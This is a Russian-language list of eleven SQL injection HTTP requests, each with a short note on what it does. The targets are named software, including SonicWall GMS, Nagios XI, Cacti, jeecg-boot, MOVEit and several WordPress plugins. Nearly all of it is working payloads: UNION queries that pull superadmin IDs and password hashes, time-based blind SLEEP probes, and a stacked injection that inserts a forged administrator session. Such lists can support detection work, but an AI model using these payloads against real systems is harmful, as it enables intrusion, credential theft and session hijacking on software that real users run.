# SQL Injection (внедрение SQL-кода)

### Запрос 1
```http
/tenant/%27%20union%20select%20%28select%20ID%20from%20SGMSDB.DOMAINS%20limit%201%29%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%28select%20concat%28id%2C%20%27%3A%27%2C%20password%29%20from%20sgmsdb.users%20where%20active%20%3D%20%271%27%20order%20by%20issuperadmin%20desc%20limit%201%20offset%200%29%2C%27%27%2C%20%27%27%2C%20%27
```
Действие: UNION-инъекция для извлечения ID и пароля из таблиц DOMAINS и users.

### Запрос 2
```http
/filter?searched_word&searched_tution_class_type[]=1&price_min=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&price_max=9&searched_price_type[]=hourly&searched_duration[]=0
```
Действие: проверка временной задержки (SQL-слепое внедрение через SLEEP(7)).

### Запрос 3
```http
/nagiosxi/index.php/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=(SELECT+CASE+WHEN+1=1+THEN+sleep(5)+ELSE+sleep(0)+END+)
```
Действие: условная задержка CASE WHEN для подтверждения SQLi.

### Запрос 4
```http
wp-json/lp/v1/courses/archive-course?order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
```
Действие: временная задержка в параметре order_by (WordPress LearnPress).

### Запрос 5
```http
/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=%22or+%22%22%3D%22%28%28%22%29%29%3BSELECT+SLEEP%2810%29%3B--+-
```
Действие: выполнение SELECT SLEEP(10) через закрытие кавычек.

### Запрос 6
```http
/jeecg-boot/sys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username
```
Действие: подстановка SQL-колонок в текстовое поле (вероятная SQLi).

### Запрос 7
```http
/human.aspx?Username=SQL%27%3BINSERT+INTO+activesessions+(SessionID)+values+(%273EtXawZuPP0O9rQkNFZp4eoDXQL%27);UPDATE+activesessions+SET+Username=(select+Username+from+users+order+by+permission+desc+limit+1)+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+LoginName=%27test@test.com%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+RealName=%27test@test.com%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+InstId=%271234%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+IpAddress=%2791.92.43.137%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+LastTouch=%272099-06-10+09:30:00%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+DMZInterface=%2710%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+Timeout=%2760%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+ResilNode=%2710%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27;UPDATE+activesessions+SET+AcctReady=%271%27+WHERE+SessionID=%273EtXawZuPP0O9rQkNFZp4eoDXQL%27%23
```
Действие: сложная многоступенчатая инъекция: вставка новой сессии с правами администратора, подмена параметров (захват сессии).

### Запрос 8
```http
/ws/msw/tenant/%27%20union%20select%20(select%20ID%20from%20SGMSDB.DOMAINS)%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20(select%20MD5(999999999))%2C%27%27%2C%20%27%27%2C%20%27
```
Действие: UNION-инъекция с вычислением MD5(999999999) для проверки выполнения запроса.

### Запрос 9
```http
/wp-admin/admin-ajax.php?action=edd_download_search&s=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-
```
Действие: SQL-задержка в плагине Easy Digital Downloads.

### Запрос 10
```http
/wp-json/wp/v2/gamipress-logs?trigger_type[]=test%27)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))x)%20AND%20(%27a%27=%27a
```
Действие: SQLi с временной задержкой через параметр массива.

### Запрос 11
```http
/module/tshirtecommerce/designer?product_id=900982561&parent_id=1;SELECT%20SLEEP(8);
```
Действие: инъекция с разделителем ; – выполнение SELECT SLEEP(8).
